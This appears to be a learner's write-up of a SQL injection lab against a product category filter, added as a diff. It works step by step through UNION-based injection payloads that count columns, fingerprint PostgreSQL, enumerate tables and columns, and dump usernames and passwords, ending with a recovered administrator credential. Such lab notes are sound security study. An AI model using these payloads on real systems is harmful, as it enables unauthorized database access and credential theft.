@@ -1,0 +1,45 @@
+SQL Injection - Product category filter (non oracle database)
+
+End Goal - 
+1. Determine a table that holds usernames and passwords.
+2. Determine the name of this table and the columns it contains.
+3. Retrieve the contents of the table to obtain the username and password of all users. 
+4. log in as the administrator user. 
+
+Analysis:
+
+1. Determine the number of columns.
+
+-> ' ORDER BY 1--
+   ' ORDER BY 2--
+   ' ORDER BY 3-- (internal server error)
+
+2. Determine the datatype of columns.
+
+-> ' UNION SELECT 'a', 'a'--
+
+3. Output the version of database.
+
+-> ' UNION SELECT @@version, NULL-- (not Microsoft)
+   ' UNION SELECT version(), NULL-- (PGSQL) [+]
+
+-> PostgreSQL 12.15 (Ubuntu 12.15-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit
+
+4. Output list of table names in the database.
+
+-> ' UNION SELECT table_name, NULL FROM information_schema.tables--
+
+-> users_pxzqhe
+
+5. Output the column names of the table.
+
+-> ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_pxzqhe'--
+
+-> username_awgzrk, password_bcdnnl
+
+6. Output the usernames and passwords.
+
+-> ' UNION SELECT username_awgzrk, password_bcdnnl FROM users_pxzqhe--
+
+-> administrator - c8w08fymgy5detj2ms7w
+
